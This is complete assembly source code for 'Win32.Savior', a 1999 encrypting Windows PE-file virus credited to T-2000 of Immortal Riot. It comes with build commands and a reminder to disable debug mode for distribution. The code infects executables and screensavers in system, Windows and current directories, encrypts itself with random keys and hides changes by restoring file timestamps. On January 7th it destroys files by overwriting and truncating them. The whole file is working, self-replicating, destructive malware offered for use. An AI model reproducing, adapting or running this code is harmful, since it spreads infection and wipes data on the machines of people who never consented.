;============================================================================
;
;
;     NAME: Win32.Savior v1.00
;     TYPE: Direct-action variable encrypting PE-infector.
;     SIZE: Around 1850 bytes.
;   AUTHOR: T-2000 / [Immortal Riot].
;   E-MAIL: T2000_@hotmail.com
;     DATE: February 1999.
;  PAYLOAD: File-trashing on January 7th.
;
;
; CAPABILITIES:
;
;       - True Win32-compatible (Win-95/NT).
;       - Variable encrypting (32-bit key).
;       - Traps possible errors with a SEH.
;       - Infects files in Windoze + System-directory.
;       - Destructive payload.
;
;
; As for now only the host's import-table is being searched for GetModule-
; HandleA/W and GetProcAddress, this method is fully Win32-compatible though
; won't work if the mentioned API's aren't imported. This virus has been
; succesfully tested both under Windows-95 and Windows-NT version 4.0.
;
;
; Dedicated to a painful death on January 7th 1999, you know who you are...
;
;
; Assemble with: TASM32 SAVIOR.ASM /m /ml
;                TLINK32 SAVIOR.OBJ IMPORT32.LIB
;                PEWRSEC SAVIOR.EXE
;
;============================================================================


                .386
                .MODEL  FLAT
                .CODE

                ORG     0


EXTRN           GetModuleHandleA:PROC   ; Hosts need to import these for
EXTRN           GetProcAddress:PROC     ; the virus to be able to spread.

EXTRN           ExitProcess:PROC        ; Only used by the carrier.


Debug_Mode      =       0               ; If true, no destruction occurs
                                        ; and only DUM?.* are infected.
                                        ; - Switch off for distribution! -

Virus_Size      EQU     (Virus_End-START)
Virus_Size_Mem  EQU     (Virus_End_Mem-START)
Max_Infect      EQU     3
Min_Size_Infect EQU     4096
Marker_File     EQU     666h


START:
                PUSH    EAX                     ; Reserve room for EIP.

                PUSHFD                          ; Save registers & flags.
                PUSHAD

                CALL    Get_Delta               ; Get our location in memory.

Anti_Moron      DB      9Ah                     ; Overlapping code, anti BP.

Get_Delta:      POP     EBP
                SUB     EBP, (Anti_Moron-START)

                MOV     EAX, 0
Init_Key        =       DWORD PTR $-4

                MOV     EBX, 0
Init_Slide      =       DWORD PTR $-4

                MOV     ECX, (Virus_End-Encrypted) / 4

                PUSH    EBP

Decrypt_DWORD:  XOR     [EBP+(Virus_Size-4)], EAX

                SUB     EBP, 4

                ADD     EAX, EBX                ; Slide decryption-key.

                RCL     EBX, 1                  ; Slide key-slider.

                LOOP    Decrypt_DWORD

                POP     EBP

IF              (($-START) MOD 4) GT 0
                DB      (4 - (($-START) MOD 4)) DUP(90h)
ENDIF

Encrypted:      MOV     EAX, EBP

                SUB     EAX, 1000h              ; Calculate image-base.
Base_Displ      =       DWORD PTR $-4

                LEA     EBX, [EAX+((Carrier-START)+1000h)]
Old_EIP_RVA     =       DWORD PTR $-4

                MOV     [ESP+(9*4)], EBX        ; Set address host in stack.

                CALL    Setup_SEH               ; PUSH SEH-address on stack.

IF              Debug_Mode

                MOV     EAX, 1                  ; Unhandled exception.

                RET

ELSE

%OUT [WARNiNG]: NoN-DeBuG-MoDe!!

ENDIF

                MOV     ESP, [ESP+8]            ; Restore original stack.

                JMP     Restore_SEH             ; Terminate program-flow.

Setup_SEH:      PUSH    DWORD PTR FS:[ECX]      ; Save original SEH-pointer.
                MOV     FS:[ECX], ESP           ; Set our own SEH.

                MOV     EBX, [EAX+3Ch]          ; PE-header.
                ADD     EBX, EAX

                MOV     EBX, [EBX+128]          ; Import-directory.
                ADD     EBX, EAX

Find_K32_Dir:   CMP     [EBX], ECX              ; Reached end of imports?
                JZ      JMP_Rest_SEH

                MOV     EDI, [EBX+(3*4)]        ; Get module-name.
                ADD     EDI, EAX

                CMP     [EDI], 'NREK'           ; Is it KERNEL32.DLL ?
                JNE     Go_Next_Dir

                CMP     [EDI+4], '23LE'
                JE      Search_Entries

Go_Next_Dir:    ADD     EBX, (5*4)              ; Go to next directory.

                JMP     Find_K32_Dir

Search_Entries: PUSH    EBX

                MOV     EBX, [EBX]              ; Array of RVA's.
                ADD     EBX, EAX

                XOR     EDX, EDX

                MOV     ESI, 1                  ; Initialize 'not found'.
                MOV     EDI, ESI

Search_Import:  MOV     ECX, [EBX+EDX]          ; Reached end of array?
                JECXZ   End_Imports

                ADD     ECX, EAX                ; Add base.

Look_4_GetMod:  PUSHAD                          ; GetModuleHandleA/W ?

                LEA     ESI, [ECX+2]
                LEA     EDI, [EBP+(Name_GetModuleHandleX-START)]
                MOV     ECX, 15
                CLD
                REPE    CMPSB
                JNE     Exit_Search_GM

                PUSHF

                MOV     AL, (Get_Module-Unicode_Switch) - 1

                CMP     BYTE PTR [ESI], 'W'     ; Unicode type?
                JNE     Store_Switch_W

                XOR     AL, AL

Store_Switch_W: MOV     [EBP+(Unicode_Switch-START)], AL

                POPF

Exit_Search_GM: POPAD

                JNE     Look_4_GetProc

                MOV     ESI, EDX

Look_4_GetProc: PUSHAD                          ; GetProcAddress ?

                LEA     ESI, [ECX+2]
                LEA     EDI, [EBP+(Name_GetProcAddress-START)]
                MOV     ECX, 15
                REPE    CMPSB

                POPAD

                JNE     Go_Next_Entry

                MOV     EDI, EDX

Go_Next_Entry:  ADD     EDX, 4                  ; Next RVA in the array.

                JMP     Search_Import

End_Imports:    POP     EBX

                MOV     EBX, [EBX+(4*4)]
                ADD     EBX, EAX

                ; Store assumed GetModuleHandle(A/W)-address.

                PUSH    DWORD PTR [EBX+ESI]
                POP     DWORD PTR [EBP+(GetModuleHandleX-START)]

                ; Store assumed GetProcAddress(A/W)-address.

                PUSH    DWORD PTR [EBX+EDI]
                POP     DWORD PTR [EBP+(GetProcAddressX-START)]

                DEC     ESI                     ; GetModuleHandle(A/W) found?
                JZ      JMP_Rest_SEH

                DEC     EDI                     ; GetProcAddress(A/W) found?
                JNZ     Init_API

JMP_Rest_SEH:   JMP     Restore_SEH             ; Abort all.

Init_API:       LEA     ESI, [EBP+(API_Names-START)]
                LEA     EDI, [EBP+(API_Addresses-START)]

Setup_Module:   PUSH    ESI

                JMP     $                       ; Use Ansi or Unicode ?
Unicode_Switch  =       BYTE PTR $-1

                ADD     ESI, 9                  ; Use Unicode equivalent.

Get_Module:     PUSH    ESI
                CALL    [EBP+(GetModuleHandleX-START)]

                POP     ESI

                OR      EAX, EAX                ; Terminate when not found.
                JZ      JMP_Rest_SEH

                XCHG    EBX, EAX                ; Save module-base in EBX.

                ADD     ESI, (3*9)              ; Start named functions.

Loop_Get_API:   PUSH    ESI                     ; Retrieve API-address of
                PUSH    EBX                     ; named function.
                CALL    [EBP+(GetProcAddressX-START)]

                CLD                             ; Store API-address.
                STOSD

                XCHG    ECX, EAX                ; API not found?
                JECXZ   JMP_Rest_SEH

Find_Next_API:  LODSB

                OR      AL, AL                  ; Found end of API-name?
                JNZ     Find_Next_API

                CMP     [ESI], AL               ; This is the end of module?
                JNZ     Loop_Get_API

                LODSB

                CMP     [ESI], AL               ; End of whole table?
                JNZ     Setup_Module

                ; Get local date & time.

                LEA     EBX, [EBP+(Local_Time-START)]
                PUSH    EBX
                CALL    [EBP+(GetLocalTime-START)]

                MOV     AL, (Read_Header-Trash_Switch) - 1

                ; Is it time to say goodbye?

                CMP     BYTE PTR [EBX.Current_Month], 1
                JNE     Start_Infect

                CMP     BYTE PTR [EBX.Current_Day], 7
                JNE     Start_Infect

                XOR     AL, AL

Start_Infect:   MOV     [EBP+(Trash_Switch-START)], AL

                LEA     ESI, [EBP+(Current_Directory-START)]
                MOV     EBX, 260

                PUSH    ESI

                PUSH    ESI                     ; Retrieve current path.
                PUSH    EBX
                CALL    [EBP+(GetCurrentDirectoryA-START)]

                ADD     ESI, EBX

                PUSH    ESI

                PUSH    EBX                     ; Retrieve Windoze-directory.
                PUSH    ESI
                CALL    [EBP+(GetWindowsDirectoryA-START)]

                ADD     ESI, EBX

                PUSH    ESI

                PUSH    EBX                     ; Retrieve System-directory.
                PUSH    ESI
                CALL    [EBP+(GetSystemDirectoryA-START)]

                ; Infect files in System-directory.

                CALL    [EBP+(SetCurrentDirectoryA-START)]
                CALL    Infect_Directory

                ; Infect files in Windoze-directory.

                CALL    [EBP+(SetCurrentDirectoryA-START)]
                CALL    Infect_Directory

                ; Infect files in current-directory.

                CALL    [EBP+(SetCurrentDirectoryA-START)]
                CALL    Infect_Directory

                ; Display the you-are-fucked-window?

                CMP     BYTE PTR [EBP+(Trash_Switch-START)], 0
                JNZ     Restore_SEH

                ; Display an OK-box with a message.

                PUSH    0
                LEA     EAX, [EBP+(Payload_Title-START)]
                PUSH    EAX
                LEA     EAX, [EBP+(Payload_Text-START)]
                PUSH    EAX
                PUSH    0
                CALL    [EBP+(MessageBoxA-START)]

Restore_SEH:    POP     DWORD PTR FS:[0]        ; Restore original SEH.
                POP     EAX                     ; Trash handler-address.

Execute_Host:   POPAD                           ; Restore registers & flags.
                POPFD

                RET                             ; RETurn to our host.


Payload_Title   DB      '.....', 0              ; Silence means death...

Payload_Text    DB      'A HUM4N G0D THA7 WAS MAN-M4DE', 0Dh
                DB      'WH3RE 1S Y0UR SAViOR N0W?!', 0


Infect_Directory:

                PUSHAD

                ; Clear infection-counter.

                AND     BYTE PTR [EBP+(Infect_Counter-START)], 0

                LEA     EAX, [EBP+(Search_Record-START)]
                PUSH    EAX
                LEA     EAX, [EBP+(Search_Mask-START)]
                PUSH    EAX
                CALL    [EBP+(FindFirstFileA-START)]

                MOV     ESI, EAX                ; Save search-handle in ESI.

                INC     EAX
                JZ      Exit_Inf_Dir

Infect_Loop:    PUSHAD

                LEA     EBX, [EBP+(Search_Record.Find_File_Name-START)]

                CMP     BYTE PTR [EBP+(Trash_Switch-START)], 0
                JZ      Extension_OK

                MOV     ESI, EBX

Find_End_Name:  LODSB                           ; Get next byte of filename.

                OR      AL, AL                  ; Found end of the ASCIIZ ?
                JNZ     Find_End_Name

                MOV     EAX, [ESI-5]            ; Get extension DWORD.
                CALL    Upcase_EAX

                CMP     EAX, 'EXE.'             ; Standard .EXE-file?
                JE      Extension_OK

                CMP     EAX, 'RCS.'             ; Screensaver?
                JNE     Exit_Infect

Extension_OK:   PUSH    EBX
                CALL    [EBP+(GetFileAttributesA-START)]

                CMP     EAX, -1                 ; Error occurred?
                JE      Exit_Infect

                MOV     ESI, EAX

                AND     AL, NOT 00000001b       ; Get rid of readonly-flag.

                PUSH    EAX
                PUSH    EBX
                CALL    [EBP+(SetFileAttributesA-START)]

                DEC     EAX                     ; Error occurred?
                JNZ     Exit_Infect

                PUSH    ESI                     ; PUSH filename + attributes
                PUSH    EBX                     ; for Restore_Attr.

                PUSH    EAX                     ; Open candidate-file.
                PUSH    EAX
                PUSH    3                       ; Open existing.
                PUSH    EAX
                PUSH    EAX
                PUSH    80000000h OR 40000000h  ; Read/write-access.
                PUSH    EBX
                CALL    [EBP+(CreateFileA-START)]

                MOV     [EBP+(File_Handle-START)], EAX

                MOV     ESI, EAX

                INC     EAX                     ; Error occurred?
                JZ      Restore_Attr

                PUSH    ESI                     ; For CloseHandle.

                PUSH    0                       ; Get candidate's filesize.
                PUSH    ESI
                CALL    [EBP+(GetFileSize-START)]

                CMP     EAX, Min_Size_Infect    ; File too small?
                JB      Close_Handle

                LEA     EAX, [EBP+(Time_Last_Write-START)]

                PUSH    EAX                     ; Get filedates & times.
                SUB     EAX, 8
                PUSH    EAX
                SUB     EAX, 8
                PUSH    EAX
                PUSH    ESI
                CALL    [EBP+(GetFileTime-START)]

                JMP     $
Trash_Switch    =       BYTE PTR $-1

IF              Debug_Mode

                JMP     Close_Handle

ENDIF
                ; Trash file with a part of the virus.

                MOV     ECX, 666
                MOV     EDX, EBP
                CALL    Write_File

                ; Truncate file at 666 bytes.

                PUSH    ESI
                CALL    [EBP+(SetEndOfFile-START)]

                JMP     Restore_Stamp

                ; Read the MZ-header.

Read_Header:    LEA     EBX, [EBP+(Header-START)]
                MOV     ECX, 40h
                CALL    Read_File
                JNZ     Close_Handle

                CMP     [EBX.EXE_Mark], 'ZM'    ; It must be a true EXE-file.
                JNE     Close_Handle

                CMP     [EBX.Reloc_Table], 40h  ; Contains a new EXE-header?
                JB      Close_Handle

                MOV     ESI, [EBX+3Ch]

                MOV     EAX, ESI                ; Seek to PE-header.
                CALL    Seek_File
                JZ      Close_Handle

                MOV     ECX, 92                 ; Read-in the PE-header.
                CALL    Read_File
                JNZ     Close_Handle

                CMP     [EBX.PE_Mark], 'EP'     ; Verify it's a PE-header.
                JNE     Close_Handle

                ; Program is executable?

                TEST    BYTE PTR [EBX.PE_Flags], 00000010b
                JZ      Close_Handle

                ; Don't infect DLL's.

                TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b
                JNZ     Close_Handle

                CMP     [EBX.CPU_Type], 14Ch    ; Must be a 386+ file.
                JNE     Close_Handle

                ; Is it already infected?

                CMP     [EBX.Checksum], Marker_File
                JE      Close_Handle

                PUSH    ESI

                ; Calculate position of the last section-header.

                MOVZX   EAX, [EBX.Number_Of_Sections]
                DEC     AX
                MOV     ECX, 40
                MUL     ECX

                ; Calculate size of PE-header.

                MOV     DX, [EBX.NT_Header_Size]
                ADD     DX, 24

                LEA     ECX, [ESI+EDX]          ; Start section-headers.

                ADD     EAX, ECX                ; EAX = last section-header.

                PUSH    EAX

                ; Seek to last section-header.

                CALL    Seek_File

                LEA     ESI, [EBP+(Last_Section_Header-START)]

                PUSH    EBX

                MOV     EBX, ESI                ; Read last section-header.
                MOV     ECX, 40
                CALL    Read_File

                POP     EBX

                MOV     EAX, [ESI.Section_RVA]
                ADD     EAX, [ESI.Section_Physical_Size]

                MOV     [EBP+(Base_Displ-START)], EAX

                XCHG    [EBX.EIP_RVA], EAX
                MOV     [EBP+(Old_EIP_RVA-START)], EAX

                ; Seek to the end of the section.

                MOV     EAX, [ESI.Section_Physical_Offset]
                ADD     EAX, [ESI.Section_Physical_Size]
                CALL    Seek_File

                MOV     EAX, [ESI.Section_Physical_Size]
                ADD     EAX, Virus_Size
                MOV     ECX, [EBX.File_Align]
                CALL    Align_EAX

                MOV     [ESI.Section_Physical_Size], EAX

                XCHG    EDI, EAX                ; Save physical-size in EDI.

                MOV     EAX, [ESI.Section_Virtual_Size]
                ADD     EAX, Virus_Size_Mem - 1
                MOV     ECX, [EBX.Object_Align]

Calc_Mem_Size:  INC     EAX
                CALL    Align_EAX

                CMP     EAX, EDI                ; Virtual-size may not be
                JB      Calc_Mem_Size           ; smaller than physical-size.

                MOV     [ESI.Section_Virtual_Size], EAX

                ADD     EAX, [ESI.Section_RVA]
                MOV     ECX, [EBX.Object_Align]
                CALL    Align_EAX

                MOV     [EBX.Image_Size], EAX

                ; Set section-flags: read, write, executable, code.

                OR      [ESI.Section_Flags], 11100000000000000000000000100000b

                LEA     EDI, [EBP+(Buffer-START)]

                PUSHAD

                ; Get a random slide-key.

                CALL    [EBP+(GetTickCount-START)]

                MOV     [EBP+(Init_Slide-START)], EAX

                XCHG    EBX, EAX

                ; Get a random encryption-key.

                CALL    [EBP+(GetTickCount-START)]

                MOV     [EBP+(Init_Key-START)], EAX

                MOV     ESI, EBP
                MOV     ECX, (Virus_Size / 2)
                CLD
                REP     MOVSW                   ; MOVSD takes one more byte,
                                                ; gotta be compact you know.

                MOV     ECX, (Virus_End-Encrypted) / 4

Encrypt_DWORD:  XOR     [EDI-4], EAX

                SUB     EDI, 4

                ADD     EAX, EBX

                RCL     EBX, 1

                LOOP    Encrypt_DWORD

                POPAD

                MOV     EDX, EDI                ; Write virusbody to end
                MOV     ECX, Virus_Size         ; of the last section.
                CALL    Write_File

                POP     EAX                     ; Offset last object-header.
                CALL    Seek_File

                ; Write updated section-header back to file.

                MOV     ECX, 40
                LEA     EDX, [EBP+(Last_Section_Header-START)]
                CALL    Write_File

                ; Seek to end of file.

                PUSH    2
                PUSH    EAX
                PUSH    EAX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(SetFilePointer-START)]

                XOR     EDX, EDX                ; Zero-pad the infected file.
                MOV     EDI, [EBX.File_Align]
                DIV     EDI

                OR      EDX, EDX                ; File is already aligned?
                JZ      Mark_Inf_File

                SUB     EDI, EDX                ; Howmany bytes to pad?

Zero_Pad:       MOV     ECX, 1                  ; Write a padding-byte.
                LEA     EDX, [EBP+(Zero_Tolerance-START)]
                CALL    Write_File

                DEC     EDI                     ; We've did 'em all?
                JNZ     Zero_Pad

Mark_Inf_File:  MOV     [EBX.Checksum], Marker_File

                POP     EAX                     ; Seek to start of PE-header.
                CALL    Seek_File

                MOV     ECX, 92                 ; Write updated PE-header.
                MOV     EDX, EBX
                CALL    Write_File

                ; Increment our infection-counter.

                INC     BYTE PTR [EBP+(Infect_Counter-START)]

                ; Restore original file-dates & times.

Restore_Stamp:  LEA     EAX, [EBP+(Time_Last_Write-START)]
                PUSH    EAX
                SUB     EAX, 8
                PUSH    EAX
                SUB     EAX, 8
                PUSH    EAX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(SetFileTime-START)]

Close_Handle:   CALL    [EBP+(CloseHandle-START)]

Restore_Attr:   CALL    [EBP+(SetFileAttributesA-START)]

Exit_Infect:    POPAD

                ; We've did enough infections?

                CMP     BYTE PTR [EBP+(Infect_Counter-START)], Max_Infect
                JNB     Close_Find

                ; Find another file.

                LEA     EAX, [EBP+(Search_Record-START)]
                PUSH    EAX
                PUSH    ESI
                CALL    [EBP+(FindNextFileA-START)]

                DEC     EAX                     ; Continue if search went OK.
                JZ      Infect_Loop

Close_Find:     PUSH    ESI                     ; Close search-handle.
                CALL    [EBP+(FindClose-START)]

Exit_Inf_Dir:   POPAD

                RET


; EAX = Offset.
; Returns ZF if error.
Seek_File:
                PUSH    0
                PUSH    0
                PUSH    EAX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(SetFilePointer-START)]

                INC     EAX

                RET


; EBX = Buffer.
; ECX = Bytes to read.
; Returns ZF if successful.
Read_File:
                PUSH    0
                LEA     EAX, [EBP+(Bytes_Read-START)]
                PUSH    EAX
                PUSH    ECX
                PUSH    EBX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(ReadFile-START)]

                DEC     EAX

                RET


; ECX = Amount of bytes.
; EDX = Buffer.
; Returns ZF if successful.
Write_File:
                PUSH    0
                LEA     EAX, [EBP+(Bytes_Read-START)]
                PUSH    EAX
                PUSH    ECX
                PUSH    EDX
                PUSH    12345678h
File_Handle     =       DWORD PTR $-4
                CALL    [EBP+(WriteFile-START)]

                DEC     EAX

                RET


Align_EAX:
                XOR     EDX, EDX
                DIV     ECX

                OR      EDX, EDX                ; Even division?
                JZ      No_Round                ; Then no need to round-up.

                INC     EAX                     ; Round-up.

No_Round:       MUL     ECX

                RET


Copyright       DB      '(c) 1999 T-2000 / Immortal Riot.', 0


Upcase_EAX:
                ROL     EAX, 8
                CALL    Upcase_AL

                ROL     EAX, 8
                CALL    Upcase_AL

                ROL     EAX, 8
                CALL    Upcase_AL

                ROL     EAX, 8

Upcase_AL:      CMP     AL, 'a'
                JB      Exit_Upcase_AL

                CMP     AL, 'z'
                JA      Exit_Upcase_AL

                SUB     AL, 'a' - 'A'

Exit_Upcase_AL: RET


IF              Debug_Mode

Search_Mask     DB      'DUM?.*', 0

ELSE

Search_Mask     DB      '*.*', 0

ENDIF


API_Names:
                DB      'KERNEL32', 0
                DW      'K', 'E', 'R', 'N', 'E', 'L', '3', '2', 0
                DB      'CreateFileA', 0
                DB      'CloseHandle', 0
                DB      'SetFilePointer', 0
                DB      'ReadFile', 0
                DB      'WriteFile', 0
                DB      'GetFileSize', 0
                DB      'FindFirstFileA', 0
                DB      'FindNextFileA', 0
                DB      'FindClose', 0
                DB      'GetFileTime', 0
                DB      'SetFileTime', 0
                DB      'GetFileAttributesA', 0
                DB      'SetFileAttributesA', 0
                DB      'GetLocalTime', 0
                DB      'SetEndOfFile', 0
                DB      'GetCurrentDirectoryA', 0
                DB      'SetCurrentDirectoryA', 0
                DB      'GetWindowsDirectoryA', 0
                DB      'GetSystemDirectoryA', 0
                DB      'GetTickCount', 0
                DB      0

                DB      'USER32', 0, 0, 0
                DW      'U', 'S', 'E', 'R', '3', '2', 0, 0, 0

                DB      'MessageBoxA', 0
                DB      0

Zero_Tolerance  DB      0


Name_GetProcAddress     DB      'GetProcAddress', 0
Name_GetModuleHandleX   DB      'GetModuleHandle'


IF              (($-START) MOD 4) GT 0
                DB      (4 - (($-START) MOD 4)) DUP(0)
ENDIF

Virus_End:


API_Addresses:

; === API's from KERNEL32.DLL. ===

CreateFileA             DD      0
CloseHandle             DD      0
SetFilePointer          DD      0
ReadFile                DD      0
WriteFile               DD      0
GetFileSize             DD      0
FindFirstFileA          DD      0
FindNextFileA           DD      0
FindClose               DD      0
GetFileTime             DD      0
SetFileTime             DD      0
GetFileAttributesA      DD      0
SetFileAttributesA      DD      0
GetLocalTime            DD      0
SetEndOfFile            DD      0
GetCurrentDirectoryA    DD      0
SetCurrentDirectoryA    DD      0
GetWindowsDirectoryA    DD      0
GetSystemDirectoryA     DD      0
GetTickCount            DD      0

; === API's from USER32.DLL. ===

MessageBoxA             DD      0


GetModuleHandleX        DD      0               ; These are being fetched
GetProcAddressX         DD      0               ; from the host's import.

Local_Time              DW      8 DUP(0)

Time_Creation           DD      0, 0
Time_Last_Access        DD      0, 0
Time_Last_Write         DD      0, 0

Infect_Counter          DB      0
Bytes_Read              DD      0
Header                  DB      92 DUP(0)
Last_Section_Header     DB      40 DUP(0)
Search_Record           DB      318 DUP(0)

Current_Directory       DB      260 DUP(0)
Windows_Directory       DB      260 DUP(0)
System_Directory        DB      260 DUP(0)

Buffer                  DB      Virus_Size DUP(0)

Virus_End_Mem:


Carrier:
                PUSH    0                       ; Terminate current process.
                CALL    ExitProcess


;---------------------- SOME USED STRUCTURES --------------------------------


EXE_Header      STRUC
EXE_Mark        DW      0                       ; MZ-marker (MZ or ZM).
Image_Mod_512   DW      0
Image_512_Pages DW      0
Reloc_Items     DW      0
Header_Size_Mem DW      0
Min_Size_Mem    DW      0
Max_Size_Mem    DW      0
Program_SS      DW      0
Program_SP      DW      0
MZ_Checksum     DW      0
Program_IP      DW      0
Program_CS      DW      0
Reloc_Table     DW      0
EXE_Header      ENDS


PE_Header               STRUC
PE_Mark                 DD      0               ; PE-marker (PE/0/0).
CPU_Type                DW      0               ; Minimal CPU required.
Number_Of_Sections      DW      0               ; Number of sections in PE.
                        DD      0
Reserved_1              DD      0
                        DD      0
NT_Header_Size          DW      0
PE_Flags                DW      0
                        DD      4 DUP(0)
EIP_RVA                 DD      0
                        DD      2 DUP(0)
Image_Base              DD      0
Object_Align            DD      0
File_Align              DD      0
                        DW      0, 0
                        DW      0, 0
                        DW      0, 0
                        DD      0
Image_Size              DD      0
                        DD      0
Checksum                DD      0
PE_Header               ENDS


Section_Header          STRUC
Section_Name            DB      8 DUP(0)        ; Zero-padded section-name.
Section_Virtual_Size    DD      0               ; Memory-size of section.
Section_RVA             DD      0               ; Start section in memory.
Section_Physical_Size   DD      0               ; Section-size in file.
Section_Physical_Offset DD      0               ; Section file-offset.
Section_Reserved_1      DD      0               ; Not used for executables.
Section_Reserved_2      DD      0               ; Not used for executables.
Section_Reserved_3      DD      0               ; Not used for executables.
Section_Flags           DD      0               ; Flags of the section.
Section_Header          ENDS


Find_First_Next_Win32   STRUC
File_Attributes         DD      0
Creation_Time           DD      0, 0
Last_Accessed_Time      DD      0, 0
Last_Written_Time       DD      0, 0
Find_File_Size_High     DD      0
Find_File_Size_Low      DD      0
Find_Reserved_1         DD      0
Find_Reserved_2         DD      0
Find_File_Name          DB      260 DUP(0)
Find_DOS_File_Name      DB      14 DUP(0)
Find_First_Next_Win32   ENDS


Date_Time               STRUC
Current_Year            DW      0
Current_Month           DW      0
Current_Day_Of_Week     DW      0
Current_Day             DW      0
Current_Hour            DW      0
Current_Minute          DW      0
Current_Second          DW      0
Current_Millisecond     DW      0
Date_Time               ENDS

                END     START





